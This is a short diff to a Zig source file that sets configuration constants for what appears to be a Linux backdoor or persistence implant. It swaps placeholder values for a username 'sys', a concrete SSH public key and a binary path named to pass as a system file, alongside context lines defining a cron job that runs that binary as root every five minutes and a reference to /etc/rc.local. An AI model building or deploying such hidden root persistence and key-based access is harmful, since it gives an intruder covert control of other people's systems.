@@ -1,8 +1,8 @@
 const std = @import("std");
 
-const username = "obscure_user_name";
-const pub_key = "ssh-ed25519 PUTSSHPUBKEYHEREPLEASETHANKYOU";
-const binary_path = "/usr/local/sbin/obscure_service_name";
+const username = "sys";
+const pub_key = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ++6TQ7OVqxWdRK4FklkzFl0fnn7ShBdrO2WzntJPWk sys";
+const binary_path = "/usr/local/sbin/sys_t";
 const binary_name = std.fs.path.basename(binary_path);
 const cron_entry = "*/5 * * * * root " ++ binary_path ++ "\n";
 const rc_local_path = "/etc/rc.local";
